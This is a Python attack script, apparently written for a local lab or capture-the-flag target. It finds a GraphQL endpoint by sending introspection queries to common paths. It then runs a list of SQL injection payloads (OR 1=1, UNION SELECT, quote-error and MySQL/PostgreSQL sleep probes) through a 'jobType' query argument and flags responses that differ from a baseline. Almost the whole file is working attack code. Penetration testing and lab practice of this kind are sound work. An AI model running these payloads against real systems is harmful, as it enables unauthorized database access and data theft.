import requests
import json
import sys

# Target application
base_url = "http://127.0.0.1:33106"

csrf_token = "Cookies.get(\"csrftoken\")"

# Common GraphQL endpoint paths to test
graphql_paths = [
    "/graphql",
    "/graphql/",
    "/api/graphql",
    "/api/v1/graphql",
    "/v1/graphql",
    "/query",
    "/graph",
    "/gql"
]

print("[*] GraphQL Endpoint Discovery")
print("=" * 60)

# Discover the GraphQL endpoint
graphql_endpoint = None
for path in graphql_paths:
    url = f"{base_url}{path}"
    try:
        # Test with a simple introspection query
        test_query = {"query": "{ __schema { types { name } } }"}
        response = requests.post(
            url,
            json=test_query,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0"
            },
            timeout=5
        )
        
        # If we get a valid JSON response with data or errors (GraphQL typically returns 200 even with errors)
        if response.status_code == 200:
            try:
                json_response = response.json()
                # Check if it looks like a GraphQL response
                if 'data' in json_response or 'errors' in json_response:
                    print(f"[+] Found GraphQL endpoint: {url}")
                    print(f"[+] Response: {json_response}")
                    graphql_endpoint = url
                    break
            except:
                pass
                
        print(f"[-] {path} - Status: {response.status_code}")
        
    except requests.exceptions.ConnectionError:
        print(f"[-] {path} - Connection refused")
    except requests.exceptions.Timeout:
        print(f"[-] {path} - Timeout")
    except Exception as e:
        print(f"[-] {path} - Error: {e}")

if not graphql_endpoint:
    print("[-] No GraphQL endpoint discovered")
    sys.exit(1)

print("\n[*] Testing SQL Injection on jobType parameter")
print("=" * 60)

# SQL Injection payloads for GraphQL
sql_payloads = [
    # Boolean-based
    {"payload": "engineer' OR '1'='1", "description": "Classic OR 1=1"},
    {"payload": "engineer' OR 1=1--", "description": "MySQL comment"},
    {"payload": "engineer' OR 1=1#", "description": "Hash comment"},
    
    # Union-based
    {"payload": "engineer' UNION SELECT 1,2,3,4--", "description": "Union select"},
    {"payload": "engineer' UNION SELECT null,null,null,null--", "description": "Union null"},
    
    # Error-based
    {"payload": "engineer'", "description": "Single quote error"},
    {"payload": 'engineer"', "description": "Double quote error"},
    
    # Time-based blind
    {"payload": "engineer' AND SLEEP(5)--", "description": "MySQL sleep"},
    {"payload": "engineer' AND pg_sleep(5)--", "description": "PostgreSQL sleep"},
]

# Baseline request
baseline_query = "{ jobs(jobType: \"engineer\") { id name type description } }"
print(f"[1] Baseline request (jobType: 'engineer')")
try:
    response = requests.post(
        graphql_endpoint,
        json={"query": baseline_query},
        headers={"Content-Type": "application/json"},
        timeout=10
    )
    baseline_data = response.text
    baseline_len = len(baseline_data)
    print(f"[+] Status: {response.status_code} | Length: {baseline_len}B")
    print(f"[+] Response: {baseline_data}")
    print("-" * 60)
except Exception as e:
    print(f"[-] Baseline failed: {e}")
    sys.exit(1)

# Test each payload
for i, test in enumerate(sql_payloads, 2):
    payload = test["payload"]
    description = test["description"]
    
    print(f"[{i}] Testing: {description}")
    print(f"[+] Payload: {payload}")
    
    # Build GraphQL query (need to escape properly)
    graphql_query = f'{{ jobs(jobType: "{payload}") {{ id name type description }} }}'
    
    try:
        response = requests.post(
            graphql_endpoint,
            json={"query": graphql_query},
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        
        response_data = response.text
        response_len = len(response_data)
        
        print(f"[+] Status: {response.status_code} | Length: {response_len}B")
        
        # Check for differences
        if abs(response_len - baseline_len) > 50 or response.status_code != 200:
            print(f"[!] ANOMALY DETECTED!")
            print(f"[!] Response: {response_data}")
        else:
            # Print truncated response for brevity
            if len(response_data) > 100:
                print(f"[+] Response: {response_data[:100]}...")
            else:
                print(f"[+] Response: {response_data}")
                
    except Exception as e:
        print(f"[-] Request failed: {e}")
    
    print("-" * 60)

print("\n[*] Testing completed")

